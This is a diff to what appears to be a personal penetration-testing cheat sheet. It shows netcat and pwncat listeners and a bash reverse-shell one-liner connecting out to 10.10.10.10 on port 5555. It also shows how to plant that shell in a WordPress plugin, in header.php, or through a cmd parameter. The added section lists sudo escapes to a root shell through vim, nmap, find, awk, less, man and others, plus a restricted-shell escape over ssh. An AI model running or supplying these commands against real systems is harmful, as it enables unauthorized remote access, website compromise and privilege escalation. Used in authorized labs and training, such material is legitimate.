@@ -68,11 +68,12 @@ I think remmina is slow, compared to xfreerdp.
 
 <h1>Listners</1>
 
-<h2>Netcat</h2>
+<h2>NETCAT</h2>
 
 <b>pform@attacker~: </b><code>nc -lnvp 5555</code>
 
-<h2>pwncat</h2> 
+<h2>PWNCAT</h2>
+
 <code>git clone https://github.com/calebstewart/pwncat.git; cd pwncat</code>
 
 <b>pform@attacker~: </b><code>pwncat -l -p 5555</code>
@@ -93,15 +94,19 @@ Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.
 
 /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'
 
-<u>Wordpress example 1.</u>
+ Wordpress example 1.
+ 
++-------------------+
 
 After logging in to the admin panel open the Plugin editor, in the bottom of a plugin.
 
 Add <code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>
 
-<u>Wordpress example 2.</u>
+ Wordpress example 2.
+ 
++-------------------+
 
-<b>Edit "header.php" </b>
+Edit "header.php"
 
 Under php tag
 
@@ -115,6 +120,43 @@ open upp burp and run command in the bottom of the page:
 
 <code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>
 
+<h1>Privesc</h1>
 
 
+GTFObins <li>https://gtfobins.github.io/</li>
 
+GTFObins is collection of sudo, SUID and other bypass techniques that can be used for linux.
+<b>sudo -l</b> lists all commands the user can use with sudo permissions
+
+
+<h2>From rbash to bash</h2>
+
+Just ssh to bash (ssh to bash)
+
+ssh user@10.10.10.10 -p 22 -t "bash -l"
+
+vim 
+<code>sudo vim</code> followed by <code>:!bash</code> (Can also edit the sudoers file to include all)
+
+nmap
+<code>sudo nmap --interactive</code> followed by <code>!sh</code>
+
+iftop
+<code>sudo iftop</code> followed by <b>shift+!</b> and Command> <code>/bin/sh</code>
+
+find
+<code>sudo find . -exec /bin/sh \; -quit</code>
+
+nano
+<code>sudo nano</code> The Press <b>"CTRL+R CTRL+X"</b><code>reset sh 1>&0 2>&0</code> Can edit the sudoers file
+
+man
+<code>sudo man</code>followed by <code>!/bin/sh</code>
+awk
+<code>sudo awk 'BEGIN {system("/bin/sh")}'</code>
+less
+<code>sudo less /etc/profile followed by !/bin/sh</code>
+ftp
+<code>sudo ftp</code>followed by <code>!/bin/sh</code>
+more
+<code>TERM= sudo more /etc/profile</code> followed by <code>!/bin/sh</code>
